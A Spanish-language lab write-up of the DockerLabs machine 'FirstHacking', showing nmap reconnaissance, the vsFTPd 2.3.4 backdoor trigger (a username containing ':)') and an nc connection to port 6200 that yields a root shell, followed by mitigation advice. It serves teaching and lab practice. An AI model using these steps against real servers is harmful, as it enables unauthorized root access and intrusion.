# DockerLabs — FirstHacking | Writeup

> Resolución de la máquina **FirstHacking** de [DockerLabs](https://dockerlabs.es), realizada en un entorno local y autorizado.

## Resumen

| Campo | Valor |
| --- | --- |
| Plataforma | DockerLabs |
| Máquina | FirstHacking |
| Dificultad | Muy fácil |
| Objetivo | Obtener ejecución de comandos como `root` |
| Servicio vulnerable | FTP (`21/tcp`) |
| Vulnerabilidad | Backdoor de vsFTPd 2.3.4 — CVE-2011-2523 |

## Despliegue

La máquina se desplegó localmente con la herramienta de DockerLabs. La dirección asignada fue:

```text
172.17.0.2
```

> La IP puede cambiar entre despliegues; debe sustituirse por la mostrada por la herramienta local.

## 1. Reconocimiento

Se realizó detección de versión, scripts NSE predeterminados y scripts orientados a vulnerabilidades sobre el puerto FTP:

```bash
nmap -sCV --script vuln -p21 172.17.0.2
```

El resultado relevante fue:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     IDs:  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root)
```

La versión detectada y el script `ftp-vsftpd-backdoor` apuntan a la variante comprometida de vsFTPd 2.3.4 asociada a CVE-2011-2523.

## 2. Vulnerabilidad identificada

En 2011 se distribuyó una copia comprometida del código fuente de vsFTPd 2.3.4. Esa variante incluía una puerta trasera: al enviar un nombre de usuario FTP que contiene `:)`, habilita una shell en el puerto TCP `6200`.

No significa que todo software etiquetado como “vsFTPd 2.3.4” tenga necesariamente esta puerta trasera; el laboratorio reproduce específicamente la variante afectada.

## 3. Explotación

Primero se inicia una sesión FTP contra la máquina:

```bash
ftp 172.17.0.2
```

Cuando el servidor solicita el nombre de usuario, se envía uno que contiene la secuencia activadora:

```text
Name (172.17.0.2:usuario): test:)
Password: <cualquier valor>
```

La sesión FTP puede finalizar con un error similar a este:

```text
500 OOPS: priv_sock_get_result
ftp: Login failed.
421 Service not available, remote server has closed connection
```

En este escenario, ese mensaje no implica que la explotación haya fallado: el inicio de sesión FTP no es el objetivo. La secuencia enviada activa el servicio oculto en el puerto `6200`.

Desde otra terminal se establece conexión a dicho puerto:

```bash
nc -nv 172.17.0.2 6200
```

Se valida el contexto obtenido:

```text
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

## 4. Evidencia e impacto

La ejecución de `id` confirma ejecución remota de comandos como `root` dentro del contenedor vulnerable. No fue necesaria una escalada de privilegios adicional.

```text
hostname
d4f97a82d376

pwd
/root/vsftpd-2.3.4
```

El acceso corresponde al contenedor del laboratorio; no debe interpretarse como acceso al host que ejecuta Docker.

## Conclusión

FirstHacking muestra la importancia de la enumeración de versiones. La secuencia fue:

1. Identificar FTP en el puerto 21.
2. Detectar la versión vulnerable mediante Nmap.
3. Asociar la variante comprometida con CVE-2011-2523.
4. Activar la puerta trasera y conectar a TCP/6200.
5. Verificar la ejecución como `root`.

## Mitigación

- Retirar de inmediato binarios o paquetes de procedencia no verificada.
- Actualizar o reinstalar vsFTPd desde repositorios confiables y con versiones mantenidas.
- Restringir la exposición de FTP mediante firewall y segmentación de red.
- Sustituir FTP sin cifrado por alternativas seguras cuando sea viable.

---

*Writeup realizado con fines educativos en un laboratorio controlado y autorizado.*
